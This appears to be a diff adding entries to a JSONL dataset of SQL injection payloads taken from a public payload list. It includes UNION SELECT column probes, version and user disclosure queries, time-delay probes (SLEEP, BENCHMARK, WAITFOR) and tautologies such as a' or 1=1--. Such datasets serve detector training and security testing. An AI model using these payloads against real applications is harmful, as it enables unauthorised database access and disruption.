+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT NULL", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT NULL#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT NULL--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT SLEEP(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT USER(),SLEEP(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT USER()--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),\"'3", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),\"'3'\"#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),3", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),4", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),4#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "WHERE 1=1 AND 1=0", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "WHERE 1=1 AND 1=0#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "WHERE 1=1 AND 1=0--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "WHERE 1=1 AND 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "WHERE 1=1 AND 1=1#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "WHERE 1=1 AND 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\\x27UNION SELECT", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "a\" or 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "a\"\"\"\" or 3=3--\"\"\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "a'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "a' or 'a' = 'a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "a' or 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "a' or 3=3--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "a' waitfor delay '0:0:10'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
